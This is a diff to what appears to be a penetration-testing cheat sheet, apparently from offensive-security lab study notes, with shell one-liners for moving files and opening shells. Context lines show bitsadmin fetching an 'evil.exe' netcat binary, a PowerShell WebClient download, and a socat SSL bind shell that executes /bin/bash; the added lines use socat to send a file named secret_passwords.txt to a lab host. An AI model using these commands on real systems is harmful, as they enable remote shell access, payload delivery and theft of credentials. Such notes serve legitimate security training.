@@ -187,6 +187,8 @@ bitsadmin /transfer evil.exe /download /priority high https://wslab.de/tools/nc.
 
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Deskto p\wget.exe')"
 
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
 ```
 
 POWERSHELL
@@ -254,6 +256,10 @@ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out 
 cat bind_shell.key bind_shell.crt > bind_shell.pem
 sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
 socat - OPENSSL:10.11.0.4:443,verify=0
+
+# send file
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+socat TCP4:10.10.0.1:443 file:received_secret_passwords.txt,create
 ```
 
 
